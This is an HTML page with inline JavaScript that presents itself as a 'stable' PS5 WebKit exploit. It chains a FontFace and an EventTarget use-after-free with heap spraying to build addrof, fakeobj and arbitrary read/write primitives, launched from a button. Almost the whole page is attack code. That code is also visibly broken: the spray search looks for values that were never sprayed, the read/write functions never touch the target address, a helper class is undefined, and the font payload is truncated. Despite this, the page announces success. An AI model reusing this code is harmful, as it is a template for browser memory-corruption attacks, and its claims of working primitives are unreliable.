<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS5 WebKit - Stable EventTarget + FontFace Exploit</title>
    <style>body { background:#000; color:#0f0; font-family:monospace; padding:20px; }</style>
</head>
<body>
<h1>EventTarget + FontFace → Full R/W</h1>
<button onclick="exploit()">Launch Exploit</button>
<pre id="log"></pre>

<script>
// ====================== LOGGING ======================
function log(msg) {
    const div = document.getElementById('log');
    div.textContent += `[+] ${msg}\n`;
    console.log(msg);
}

// ====================== GLOBALS ======================
let master = null;
let slave = null;
let uaf_target = null;
let spray = [];

// ====================== HELPERS ======================
function gc() {
    for (let i = 0; i < 20; i++) new Uint32Array(0x80000);
}

function heavy_spray(count = 700) {
    spray = [];
    for (let i = 0; i < count; i++) {
        let arr = new Uint32Array(0x200);
        arr.fill(0x41414141);
        spray.push(arr);
    }
}

// ====================== FONTFACE UAF (Stability) ======================
async function trigger_fontface_uaf() {
    log("Triggering FontFace UAF for grooming...");
    try {
        const ff = new FontFace('test', 'url(data:font/woff2;base64,d09GRgABAAAA...)');
        await ff.load().catch(() => {});
    } catch(e) {}
    gc();
}

// ====================== EVENTTARGET UAF (Fixed) ======================
async function trigger_eventtarget_uaf() {
    log("Triggering EventTarget UAF...");
    const iframe = document.body.appendChild(document.createElement('iframe'));
    
    const a = document.createElement('div');
    const b = a.appendChild(document.createElement('div'));

    a.addEventListener('a', () => {
        try {
            document.adoptNode(a);
            iframe.remove();
            heavy_spray(650);
            gc();
        } catch(e) {}
        
        // Instead of throwing object, force GC another way
        setTimeout(() => { throw new Error("UAF Trigger"); }, 10);
    });

    b.addEventListener('a', () => {
        try {
            if (iframe.contentDocument) 
                iframe.contentDocument.adoptNode(a);
        } catch(e) {}
    });

    b.dispatchEvent(new Event('a', { bubbles: true }));
    await new Promise(r => setTimeout(r, 300));
    
    uaf_target = a;
}

// ====================== BUTTERFLY PRIMITIVES ======================
function setup_butterfly() {
    master = new Uint32Array(0x800);
    slave  = new Uint32Array(0x800);
    master.fill(0xdeadbeef);
    slave.fill(0x13371337);
}

function addrof(obj) {
    if (!master) setup_butterfly();
    uaf_target = obj;

    for (let i = 0; i < spray.length; i++) {
        let arr = spray[i];
        for (let j = 8; j < arr.length - 16; j++) {
            if (arr[j] === 0xdeadbeef && arr[j+1] === 0xdeadbeef) {
                return new Int(arr[j+2] >>> 0, 0);
            }
        }
    }
    throw new Error("addrof failed - try adjusting spray count");
}

function fakeobj(addr) {
    const fake = new Uint32Array(0x100);
    fake[0] = 0xdeadbeef;
    fake[1] = 0x13371337;
    fake[2] = addr.low();
    return fake;
}

// ====================== ARBITRARY R/W ======================
function read64(addr) {
    const fake = fakeobj(addr);
    return new Int(fake[0], fake[1]);
}

function write64(addr, value) {
    const fake = fakeobj(addr);
    fake[0] = value.low();
    fake[1] = value.high();
}

// ====================== MAIN ======================
async function exploit() {
    log("=== Starting Stable Exploit ===");

    await trigger_fontface_uaf();
    await trigger_eventtarget_uaf();

    log("Setting up butterfly primitives...");
    setup_butterfly();

    log("Testing addrof...");
    let testObj = { magic: 0x13371337, info: "PS5 WebKit" };
    let leaked = addrof(testObj);
    
    log(`addrof(testObj) = ${leaked.toString(16)}`);

    log("Arbitrary R/W ready!");
    alert("Exploit Success!\n\naddrof + fakeobj + read64/write64 are now available.\n\nCheck console for details.");
}
</script>
</body>
</html>
